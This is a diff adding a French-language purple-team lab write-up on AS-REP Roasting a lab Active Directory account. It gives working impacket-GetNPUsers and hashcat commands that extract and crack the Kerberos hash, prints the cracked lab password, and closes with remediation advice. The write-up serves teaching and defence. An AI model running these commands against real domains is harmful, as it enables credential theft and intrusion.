@@ -230,3 +230,53 @@ Cette chaîne représente un scénario de mouvement latéral classique : comprom
 - **Rapport de pentest final** structuré
 
 Voir [Kerberoasting + Détection Wazuh](ad-kerberoasting.md) pour la première partie de ce labo.
+
+
+## AS-REP Roasting — `svc_legacy`
+
+Le compte `svc_legacy` a été configuré avec l'option **"Do not require Kerberos preauthentication"**, une mauvaise pratique classique qui permet d'extraire un hash Kerberos sans aucune authentification préalable sur le domaine.
+
+### Vérification du flag côté DC
+
+```powershell
+Get-ADUser svc_legacy -Properties DoesNotRequirePreAuth | Select Name, DoesNotRequirePreAuth
+```
+
+```
+Name   DoesNotRequirePreAuth
+----   ---------------------
+Legacy                  True
+```
+
+### Extraction du hash (sans authentification)
+
+```bash
+impacket-GetNPUsers LABO.LOCAL/svc_legacy -no-pass -dc-ip 192.168.10.1 -outputfile asrep_hashes.txt
+```
+
+Résultat : un hash `$krb5asrep$23$svc_legacy@LABO.LOCAL:...` récupéré sans connaître le mot de passe du compte, uniquement en connaissant son nom.
+
+### Cassage hors-ligne avec hashcat
+
+Première tentative avec `rockyou.txt` (mode `18200`) : `Status: Exhausted`, le mot de passe n'était pas présent dans la wordlist publique.
+
+![AS-REP rockyou exhausted](media/purple-team/19-hashcat-asrep-rockyou-exhausted-newhash.png)
+
+En combinant une wordlist ciblée avec les règles de mutation hashcat (`best64.rule`), le mot de passe `Summer2026!` a été retrouvé en moins d'une seconde :
+
+```bash
+hashcat -m 18200 asrep_hashes.txt custom.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+![AS-REP cracked](media/purple-team/18-hashcat-asrep-cracked-svclegacy.png)
+
+```
+Status...........: Cracked
+Candidates.#01...: Summer2026! -> Summer2026!
+```
+
+### Enseignement
+
+- L'AS-REP Roasting ne nécessite **aucun compte valide** : un attaquant n'a besoin que d'un nom d'utilisateur.
+- Le mot de passe `Summer2026!` suit un motif saisonnier prévisible (mois/année), un classique dans les environnements d'entreprise mal sensibilisés.
+- Remédiation : désactiver `Do not require Kerberos preauthentication` sauf nécessité technique réelle, et appliquer une politique de mots de passe interdisant les motifs saisonniers/temporels.
